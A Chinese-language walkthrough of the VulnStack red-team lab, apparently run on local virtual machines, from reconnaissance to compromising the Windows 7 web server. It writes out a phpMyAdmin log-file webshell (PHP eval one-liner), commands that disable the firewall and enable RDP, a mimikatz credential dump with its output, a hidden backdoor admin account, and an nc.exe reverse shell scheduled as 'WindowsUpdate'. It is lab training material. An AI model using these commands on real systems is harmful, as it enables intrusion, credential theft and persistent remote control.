# 前言
	尝试自己做一遍难度一的域渗透，拿下黄金票据

前置准备：
自备	
	kali Linux 系统       NAT模式
红日实验室官网下载
	win 7 Web服务器  NAT模式/仅主机模式
	win 2003 域成员    仅主机模式
	win 2008 域控       仅主机模式

虚拟机配置：
kali能正常上网，并且在win7关闭防火墙的情况下，能ping通，但是ping不通另外两台
win7能互pingkali，也能ping通另外两个域控主机
# 信息收集
## 信息探测
### 配置信息

| 系统      | 网卡  | IP地址           |
| ------- | --- | -------------- |
| kali    | vm8 | 192.168.99.130 |
| win7    | vm8 | 192.168.99.128 |
| win7    | vm2 | 192.168.52.143 |
| win2003 | vm2 | 192.168.52.141 |
| win2008 | vm2 | 192.168.52.138 |
## 收集信息
```bash
# 用nmap  扫描网段内存活的主机信息
nmap -sn 192.168.99.0/24
```
***分析信息
![](./附件/VulnStack红队实战一-2026-04-13-22-55-08.png)

	结论：一共五台设备上线，.2,.1,.254排除，大概率是网关地址，.130则是本机kali的地址，现在剩下的也就是一台存活主机了，再尝试扫描一下他都开启了哪些端口服务。

```bash
# 全端口扫描,SYN半开扫描，更好的隐藏性，最全面的扫描，时间稍微长一点
nmap -sV -sS -T4 -O -p- 192.168.99.128
```
***分析信息
![](./附件/VulnStack红队实战一-2026-04-13-23-05-33.png)

	结论：对方开启了80与3306的端口，其他暂未探测到，应该是被防火墙滤掉了，中间件是apache 2.4.23的，MySQL数据库（3306）
	系统则是Windows server 2008和Windows 7，他们的相似性很高，所以会出现这两个。

***测试网站能否连接到
```
# curl 测试
curl -I http://192.168.99.128     # 查看返回状态码，200，正常访问到

# 或 查看网页信息
curl http://192.168.99.128

# 以上测试通过就用浏览器访问，进行下一步打点侦察
```
![](./附件/VulnStack红队实战一-2026-04-14-10-28-30.png)

	结论：返回值200，正常访问。

***网页信息收集
![](./附件/VulnStack红队实战一-2026-04-14-10-31-09.png)
重大发现！

	敏感信息泄露：
	网站地址根目录，以及当前网页地址；
	MySQL测试连接窗口，可以尝试弱口令登录试试；
	网页中间有个默认支持函数样例，打开可以看到很多敏感执行函数，并且下方有函数检测机制，可作为备选。

***目录扫描
```bash
# 使用kali自带工具 gobuster ；这个路径是存放常见网站目录的文件，-x 后续的则是需要探测的文件
gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,zip,rar,bak -u http://192.168.99.128
```

![](./附件/VulnStack红队实战一-2026-04-14-10-42-28.png)

		结论：扫到了两个phpMyAdmin的子目录，尝试浏览器访问一下，是否有可以利用的漏洞点


***敏感网站漏洞利用点
```bash
# 目标发现！！！ 是个登录的，尝试弱口令手工测试，或者借助phpMyAdmin多线程爆破工具，用burp也可以，但是需要设置token设置抓包爆破

# 弱口令集：
# root 123456 admin admin123 root123 user password等
```

![697](./附件/VulnStack红队实战一-2026-04-14-10-48-20.png)

	结论：是个数据库登陆界面，这个界面用的则是PHP study（小皮面板）的，对方的网站是基于这个搭建的。
	经过测试，用户名和密码都是root

***登录后的界面
![](./附件/VulnStack红队实战一-2026-04-14-10-56-03.png)

	结论：MySQL数据库管理后台！！！可以直接做webshell一句话木马了；
	并且数据库的版本，名词以及一些信息都展示出来了
	点击SQL，进行SQL命令写入

***SQL命令写入
```bash
# 检查MySQL数据库能否写入文件
show variables like 'secure_file_priv';   # 显示NULL则是无法写入文件，不能写入的话就看一下general_log的这个能否写入，不能写入就把这个general_log的文件写入权限打开

# 检查都有哪些log日志文件
show variables like '%log%';              # 主要检查general_file的路径 和generla_log的开启状态，OFF则是没有开启全局日志

# 或者不做第二步，直接查general_log的文件
show variables like 'general_log';        # 查看日志是否开启，off是关闭
show variables like 'general_log_file';   # 查看日志存放路径

```

![](./附件/VulnStack红队实战一-2026-04-14-11-08-34.png)

![](./附件/VulnStack红队实战一-2026-04-14-11-24-36.png)

![](./附件/VulnStack红队实战一-2026-04-14-11-24-11.png)

	结论：secure_file_priv文件不能写入，检查另外一个日志文件，显示是关闭状态，再查看了一下这个日志存放的路径，不在WWW根目录里面，我们访问不到。
	解决方案：开启log的功能，再把路径修改成WWW下即可


***修改SQL配置
```bash
# 开启general_log日志能功能；
set global general_log = 'ON';

# 修改日志存放位置，并且能将webshell.php这个文件包含进去
set global gereral_log_file = 'C:/phpStudy/WWW/webshell.php';

# 一句话木马，用于远程连接
select '<?php @eval($_POST["cmd"]); ?>';

```


![](./附件/VulnStack红队实战一-2026-04-14-11-37-35.png)

	结论：成功将其写入进去，可以用蚂蚁剑远程连接了。

***蚂蚁剑连接
	
	注：打开蚂蚁剑，空白处右键<添加数据>，有个url地址，将目标服务器的地址写进去，我的是http://192.168.99.128/webshell.php
	密码为之前写入的一句话木马里面的cmd，点击测试连接，正常情况下会链接上的，打开之后就是这个样子
![](./附件/VulnStack红队实战一-2026-04-14-11-41-17.png)

	结论：这些是目标服务器的网站结构，可以做一些操作，详情就右键看一下，比如上传个cs工具，用于内网渗透，攻击域内靶机。

***虚拟终端
	右键打开虚拟终端，没有的话就在插件市场下载一下就行
```bash
# 查看当前主机账户信息，一般看到这个路径就知道是管理员了
whoami

# 查看本用户
net user

# 查看IP地址，有什么网络信息，双网卡之类的
ipconfig                # 会看到两张网卡，一个99的，一张52的，也就是内网靶机

# 查看系统信息
systeminfo
```


***获取到的系统信息
```bash
# 从终端中执行的命令

C:\phpStudy\WWW> whoami             # 是个域管理员

god\administrator

C:\phpStudy\WWW> net user

\\STU1 的用户帐户

-------------------------------------------------------------------------------

Administrator            Guest                    liukaifeng01             

命令成功完成。

C:\phpStudy\WWW> ipconfig

Windows IP 配置

以太网适配器 本地连接 5:

   连接特定的 DNS 后缀 . . . . . . . : localdomain

   本地链接 IPv6 地址. . . . . . . . : fe80::a818:f9a6:5a0d:bbb9%26

   IPv4 地址 . . . . . . . . . . . . : 192.168.99.128    # web服务器，外网环境

   子网掩码  . . . . . . . . . . . . : 255.255.255.0

   默认网关. . . . . . . . . . . . . : 192.168.99.2

以太网适配器 Npcap Loopback Adapter:

   连接特定的 DNS 后缀 . . . . . . . : 

   本地链接 IPv6 地址. . . . . . . . : fe80::b461:ccad:e30f:81ba%24

   自动配置 IPv4 地址  . . . . . . . : 169.254.129.186

   子网掩码  . . . . . . . . . . . . : 255.255.0.0

   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接 3:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

以太网适配器 本地连接 2:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 

   本地链接 IPv6 地址. . . . . . . . : fe80::653d:23d6:de8d:ab50%11

   IPv4 地址 . . . . . . . . . . . . : 192.168.52.143      # 内网地址！！！

   子网掩码  . . . . . . . . . . . . : 255.255.255.0

   默认网关. . . . . . . . . . . . . : 192.168.52.2

隧道适配器 isatap.localdomain:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : localdomain

隧道适配器 isatap.{4DAEBDFD-0177-4691-8243-B73297E2F0FF}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{448DCBB5-7D61-4538-9C03-66B5CDAD1222}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{EC57C4EB-763E-4000-9CDE-4D7FF15DF74C}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{560BEAFC-DAC4-4687-A564-57790875DC43}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开

   连接特定的 DNS 后缀 . . . . . . . : 

C:\phpStudy\WWW> systeminfo

主机名:           STU1

OS 名称:          Microsoft Windows 7 专业版 

OS 版本:          6.1.7601 Service Pack 1 Build 7601

OS 制造商:        Microsoft Corporation

OS 配置:          成员工作站

OS 构件类型:      Multiprocessor Free

注册的所有人:     Windows 用户

注册的组织:       

产品 ID:          00371-177-0000061-85693

初始安装日期:     2019/8/25, 9:54:10

系统启动时间:     2026/4/14, 13:12:45

系统制造商:       VMware, Inc.

系统型号:         VMware Virtual Platform

系统类型:         x64-based PC

处理器:           安装了 1 个处理器。

                  [01]: AMD64 Family 25 Model 116 Stepping 1 AuthenticAMD ~3992 Mhz

BIOS 版本:        Phoenix Technologies LTD 6.00, 2020/11/12

Windows 目录:     C:\Windows

系统目录:         C:\Windows\system32

启动设备:         \Device\HarddiskVolume1

系统区域设置:     zh-cn;中文(中国)

输入法区域设置:   zh-cn;中文(中国)

时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐

物理内存总量:     2,047 MB

可用的物理内存:   1,265 MB

虚拟内存: 最大值: 4,095 MB

虚拟内存: 可用:   3,209 MB

虚拟内存: 使用中: 886 MB

页面文件位置:     C:\pagefile.sys

域:               god.org                           # 是个域环境！！！要做横向移动了

登录服务器:       \\OWA                              # 域控制器

修补程序:         安装了 4 个修补程序。                # 四个补丁，很少！！！ 

                  [01]: KB2534111                  

                  [02]: KB2999226

                  [03]: KB958488

                  [04]: KB976902

网卡:             安装了 5 个 NIC。

                  [01]: Intel(R) PRO/1000 MT Network Connection

                      连接名:      本地连接

                      启用 DHCP:   否

                      IP 地址

                        [01]: 192.168.52.143

                        [02]: fe80::653d:23d6:de8d:ab50

                  [02]: TAP-Windows Adapter V9

                      连接名:      本地连接 2

                      状态:        媒体连接已中断

                  [03]: Microsoft Loopback Adapter

                      连接名:      Npcap Loopback Adapter

                      启用 DHCP:   是

                      DHCP 服务器: 255.255.255.255

                      IP 地址

                        [01]: 169.254.129.186

                        [02]: fe80::b461:ccad:e30f:81ba

                  [04]: TAP-Windows Adapter V9

                      连接名:      本地连接 3

                      状态:        媒体连接已中断

                  [05]: Intel(R) PRO/1000 MT Network Connection

                      连接名:      本地连接 5

                      启用 DHCP:   是

                      DHCP 服务器: 192.168.99.254

                      IP 地址

                        [01]: 192.168.99.128

                        [02]: fe80::a818:f9a6:5a0d:bbb9

C:\phpStudy\WWW>
```

***继续做渗透利用
```bash
# 查看端口开放情况
netstat -an              

# 补丁很少，可以看看又没哟可利用的漏洞点，先查查445端口信息
# 可以查查敏感端口是否开放，443，445，3389等
netstat -an | find ":445"           # 如果不对就是netstat -an | findstr ":445"
netstat -an | find ":3389"

# 查看防火墙状态
netsh advfirewall show allprofiles

# 关闭防火墙，关闭之后记得及时查看状态
netsh advfirewall set allprofiles state off

# 开启防火墙是这个命令，按需执行即可
netsh advfirewall set allprofiles state on

# 开启RDP(3389)远程桌面，这个改的是注册表信息
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# 加入3389规则防火墙，以防万一，虽然关闭了防火墙，但是有时候会出问题
netsh advfirewall firewall add rule name="RDP 3389" dir=in protocol=tcp localport=3389 action=allow
```

***提取内存密码
```bash
# kali系统中ing
# 第一次用这个mimikatz这个软件，就先下载一下，有的话就不需要这一步了
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

# 解压
unzip mimikatz_trunk.zip

# 使用蚂蚁剑连接到目标web服务器，右键点击上传，选择这个mimikatz的文件夹里里面，将这个.exe的程序上传

# 上传之后，用命令行执行命令，调试，读取内存密码，并且保存在当前路径下的passowrd.txt文档下
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt

```

![](./附件/VulnStack红队实战一-2026-04-14-18-31-08.png)

	结论：将程序上传上去之后，右下角会有提示，然后在对方目标服务器的目录下会有这个程序

***虚拟终端输出内容
```bash
# 命令窗口
C:\phpStudy\WWW> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > password.txt
 
C:\phpStudy\WWW> echo password.txt
password.txt
 
C:\phpStudy\WWW> type password.txt
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz(commandline) # privilege::debug
Privilege '20' OK
mimikatz(commandline) # sekurlsa::logonpasswords
Authentication Id : 0 ; 1481721 (00000000:00169bf9)
Session           : Interactive from 1
User Name         : Administrator
Domain            : GOD
Logon Server      : OWA
Logon Time        : 2026/4/14 13:13:03
SID               : S-1-5-21-2952760202-1353902439-2381784089-500
    msv :    
     [00000003] Primary
     * Username : Administrator
     * Domain   : GOD
     * LM       : b9f0ea2d62d9c4e8af84d1bb761ed383
     * NTLM     : 56fdfd5d33434048eeaf96de6ae5d0ab
     * SHA1     : f85451caedd9ed0fcc0c79c1250822dad6de166a
    tspkg :    
     * Username : Administrator
     * Domain   : GOD
     * Password : hong@2019
    wdigest :    
     * Username : Administrator
     * Domain   : GOD
     * Password : hong@2019
    kerberos :    
     * Username : Administrator
     * Domain   : GOD.ORG
     * Password : hong@2019
    ssp :    
    credman :    
Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/4/14 13:12:51
SID               : S-1-5-19
    msv :    
    tspkg :    
    wdigest :    
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    kerberos :    
     * Username : (null)
     * Domain   : (null)
     * Password : (null)
    ssp :    
    credman :    
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : STU1$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2026/4/14 13:12:51
SID               : S-1-5-20
    msv :    
     [00000003] Primary
     * Username : STU1$
     * Domain   : GOD
     * NTLM     : c5c8d9f2d9c3c7de82d4e56b792046ce
     * SHA1     : 4dfcc395a1c51171f13f68c000c6815caec6c311
    tspkg :    
    wdigest :    
     * Username : STU1$
     * Domain   : GOD
     * Password : 0b 80 73 2c d9 3e 7e 05 36 7f 4f c0 5f d1 3a db 48 52 9e 2b 3a 19 a2 8a 2b f6 a2 a6 2f c2 08 76 fa c0 f9 58 61 e6 3a ce 1b 49 98 97 72 15 7e 34 b3 0a bd d6 93 bc 22 42 93 09 ec 1f ab 60 21 d9 d5 4c 72 a7 b9 16 d6 53 b6 16 05 10 99 90 d2 b0 c4 52 4d 1d 5f 37 2d b7 19 de 87 8f e7 3d 12 29 f6 24 2e f8 a5 b9 6e 05 13 53 aa 3c 83 c4 a5 c9 43 0e 75 25 b2 91 72 4e 17 30 53 45 4e d9 b2 62 8d 7f 35 a5 aa 0b 75 6c dd 02 bf 84 db 54 d6 03 a9 40 0f 2b ec 77 4d 9d e4 10 9f 08 90 6e 94 f0 01 18 3a 6a 7d e6 ea c3 17 7a 5f 57 92 52 d6 54 43 de 75 e5 d8 40 1a 3a 7d 08 58 b2 3a 8e 4c 86 cf c3 13 d0 e2 29 63 9d d8 49 ac 92 98 bb af 25 11 41 04 cb 62 a1 a2 89 47 a8 e5 7c 54 ca b6 f1 cd 49 73 11 9c be 8b 75 2d cf a2 08 4f 8b 15 d4 
    kerberos :    
     * Username : stu1$
     * Domain   : GOD.ORG
     * Password : 0b 80 73 2c d9 3e 7e 05 36 7f 4f c0 5f d1 3a db 48 52 9e 2b 3a 19 a2 8a 2b f6 a2 a6 2f c2 08 76 fa c0 f9 58 61 e6 3a ce 1b 49 98 97 72 15 7e 34 b3 0a bd d6 93 bc 22 42 93 09 ec 1f ab 60 21 d9 d5 4c 72 a7 b9 16 d6 53 b6 16 05 10 99 90 d2 b0 c4 52 4d 1d 5f 37 2d b7 19 de 87 8f e7 3d 12 29 f6 24 2e f8 a5 b9 6e 05 13 53 aa 3c 83 c4 a5 c9 43 0e 75 25 b2 91 72 4e 17 30 53 45 4e d9 b2 62 8d 7f 35 a5 aa 0b 75 6c dd 02 bf 84 db 54 d6 03 a9 40 0f 2b ec 77 4d 9d e4 10 9f 08 90 6e 94 f0 01 18 3a 6a 7d e6 ea c3 17 7a 5f 57 92 52 d6 54 43 de 75 e5 d8 40 1a 3a 7d 08 58 b2 3a 8e 4c 86 cf c3 13 d0 e2 29 63 9d d8 49 ac 92 98 bb af 25 11 41 04 cb 62 a1 a2 89 47 a8 e5 7c 54 ca b6 f1 cd 49 73 11 9c be 8b 75 2d cf a2 08 4f 8b 15 d4 
    ssp :    
    credman :    
Authentication Id : 0 ; 51151 (00000000:0000c7cf)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/4/14 13:12:51
SID               : 
    msv :    
     [00000003] Primary
     * Username : STU1$
     * Domain   : GOD
     * NTLM     : c5c8d9f2d9c3c7de82d4e56b792046ce
     * SHA1     : 4dfcc395a1c51171f13f68c000c6815caec6c311
    tspkg :    
    wdigest :    
    kerberos :    
    ssp :    
    credman :    
Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STU1$
Domain            : GOD
Logon Server      : (null)
Logon Time        : 2026/4/14 13:12:51
SID               : S-1-5-18
    msv :    
    tspkg :    
    wdigest :    
     * Username : STU1$
     * Domain   : GOD
     * Password : 0b 80 73 2c d9 3e 7e 05 36 7f 4f c0 5f d1 3a db 48 52 9e 2b 3a 19 a2 8a 2b f6 a2 a6 2f c2 08 76 fa c0 f9 58 61 e6 3a ce 1b 49 98 97 72 15 7e 34 b3 0a bd d6 93 bc 22 42 93 09 ec 1f ab 60 21 d9 d5 4c 72 a7 b9 16 d6 53 b6 16 05 10 99 90 d2 b0 c4 52 4d 1d 5f 37 2d b7 19 de 87 8f e7 3d 12 29 f6 24 2e f8 a5 b9 6e 05 13 53 aa 3c 83 c4 a5 c9 43 0e 75 25 b2 91 72 4e 17 30 53 45 4e d9 b2 62 8d 7f 35 a5 aa 0b 75 6c dd 02 bf 84 db 54 d6 03 a9 40 0f 2b ec 77 4d 9d e4 10 9f 08 90 6e 94 f0 01 18 3a 6a 7d e6 ea c3 17 7a 5f 57 92 52 d6 54 43 de 75 e5 d8 40 1a 3a 7d 08 58 b2 3a 8e 4c 86 cf c3 13 d0 e2 29 63 9d d8 49 ac 92 98 bb af 25 11 41 04 cb 62 a1 a2 89 47 a8 e5 7c 54 ca b6 f1 cd 49 73 11 9c be 8b 75 2d cf a2 08 4f 8b 15 d4 
    kerberos :    
     * Username : stu1$
     * Domain   : GOD.ORG
     * Password : 0b 80 73 2c d9 3e 7e 05 36 7f 4f c0 5f d1 3a db 48 52 9e 2b 3a 19 a2 8a 2b f6 a2 a6 2f c2 08 76 fa c0 f9 58 61 e6 3a ce 1b 49 98 97 72 15 7e 34 b3 0a bd d6 93 bc 22 42 93 09 ec 1f ab 60 21 d9 d5 4c 72 a7 b9 16 d6 53 b6 16 05 10 99 90 d2 b0 c4 52 4d 1d 5f 37 2d b7 19 de 87 8f e7 3d 12 29 f6 24 2e f8 a5 b9 6e 05 13 53 aa 3c 83 c4 a5 c9 43 0e 75 25 b2 91 72 4e 17 30 53 45 4e d9 b2 62 8d 7f 35 a5 aa 0b 75 6c dd 02 bf 84 db 54 d6 03 a9 40 0f 2b ec 77 4d 9d e4 10 9f 08 90 6e 94 f0 01 18 3a 6a 7d e6 ea c3 17 7a 5f 57 92 52 d6 54 43 de 75 e5 d8 40 1a 3a 7d 08 58 b2 3a 8e 4c 86 cf c3 13 d0 e2 29 63 9d d8 49 ac 92 98 bb af 25 11 41 04 cb 62 a1 a2 89 47 a8 e5 7c 54 ca b6 f1 cd 49 73 11 9c be 8b 75 2d cf a2 08 4f 8b 15 d4 
    ssp :    
    credman :    
mimikatz(commandline) # exit
Bye!
 
```

	结论：已经拿到了这台电脑的所有信息！！！可以进行内网横向移动了！！！

***添加后门与定时反弹shell
```bash
# 添加隐藏后门用户
net user backdoor$ P@ssw0rd123 /add
net localgroup administrators backdoor$ /add 

# 题外话，做蓝队查询隐藏后门用户的时候可以用这个
wmic useraccount get name

# 添加定时反弹shell，为一个小时
schtasks /create /tn "WindowsUpdate" /tr "C:\nc.exe -e cmd.exe 你的IP 4444" /sc hourly /ru SYSTEM

# 注册表开机自启动
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemCheck" /t REG_SZ /d "C:\shell.exe" /f 
```

	结论：至此，这台Windows 7 的Web服务器已经成为了跳板机（肉鸡/傀儡机）了，接下来横向移动！！！